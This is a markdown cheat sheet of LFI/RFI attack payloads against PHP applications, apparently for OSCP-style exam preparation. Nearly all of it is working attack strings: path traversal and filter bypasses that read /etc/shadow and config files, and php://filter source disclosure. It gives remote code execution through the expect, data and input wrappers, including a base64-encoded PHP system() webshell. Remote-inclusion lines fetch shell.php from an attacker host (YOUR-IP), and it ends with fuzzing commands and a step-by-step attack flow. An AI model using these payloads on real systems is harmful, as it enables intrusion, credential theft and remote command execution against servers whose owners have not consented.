# LFI / RFI Payload Cheat Sheet 

---

## 1. LFI Detection

### Basic
```
http://target/index.php?file=/etc/passwd
http://target/index.php?file=../../../../etc/passwd
```

### Deep Traversal
```
http://target/index.php?file=../../../../../../../../etc/passwd
```

### Windows
```
http://target/index.php?file=C:\Windows\win.ini
```

---

## 2. Encoding Bypass

```
http://target/index.php?file=..%2f..%2f..%2fetc/passwd
http://target/index.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## 3. Recursive Bypass

```
http://target/index.php?file=....//....//....//etc/passwd
http://target/index.php?file=..././..././etc/passwd
```

---

## 4. Approved Path Bypass

```
http://target/index.php?file=languages/../../../../etc/passwd
http://target/index.php?file=./languages/../../../../etc/passwd
```

---

## 5. Important Files

### Linux
```
http://target/index.php?file=../../../../etc/passwd
http://target/index.php?file=../../../../etc/shadow
http://target/index.php?file=../../../../etc/hosts
```

### Apache / Logs
```
http://target/index.php?file=../../../../etc/apache2/apache2.conf
http://target/index.php?file=../../../../etc/apache2/envvars
http://target/index.php?file=../../../../var/log/apache2/access.log
http://target/index.php?file=../../../../var/log/apache2/error.log
```

### Webroot
```
http://target/index.php?file=../../../../var/www/html/index.php
http://target/index.php?file=../../../../var/www/html/config.php
```

---

## 6. PHP Filter (Source Code Disclosure)

```
http://target/index.php?file=php://filter/read=convert.base64-encode/resource=index
http://target/index.php?file=php://filter/read=convert.base64-encode/resource=config
http://target/index.php?file=php://filter/read=convert.base64-encode/resource=db
```

---

## 7. RCE via PHP Wrappers

### Expect Wrapper
```
http://target/index.php?file=expect://id
http://target/index.php?file=expect://whoami
http://target/index.php?file=expect://cat /flag.txt
```

---

### Data Wrapper
```
http://target/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id
http://target/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=cat /flag.txt
```

---

### Input Wrapper
```
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?file=php://input&cmd=id"
```

---

## 8. RFI Payloads

### HTTP
```
http://target/index.php?file=http://YOUR-IP/shell.php&cmd=id
```

### FTP
```
http://target/index.php?file=ftp://YOUR-IP/shell.php&cmd=id
```

### SMB (Windows)
```
http://target/index.php?file=\\YOUR-IP\share\shell.php&cmd=whoami
```

---

## 9. File Upload + LFI

```
http://target/index.php?file=./uploads/shell.gif&cmd=id
```

---

## 10. ZIP Wrapper

```
http://target/index.php?file=zip://./uploads/shell.jpg%23shell.php&cmd=id
```

---

## 11. PHAR Wrapper

```
http://target/index.php?file=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id
```

---

## 12. Fuzzing

### Parameter Fuzzing
```
ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target/index.php?FUZZ=test'
```

### LFI Fuzzing
```
ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?file=FUZZ'
```

### Webroot Discovery
```
ffuf -w default-web-root-directory-linux.txt:FUZZ \
-u 'http://target/index.php?file=../../../../FUZZ/index.php'
```

---

## 13. Quick OSCP Flow

```
1. Find parameter (?file=, ?page=)
2. Test /etc/passwd
3. Try ../../ traversal
4. Apply bypass (....//, encoding)
5. Read config (apache2.conf)
6. Use php://filter
7. Try RCE (expect → data → input)
8. Use upload if available
```
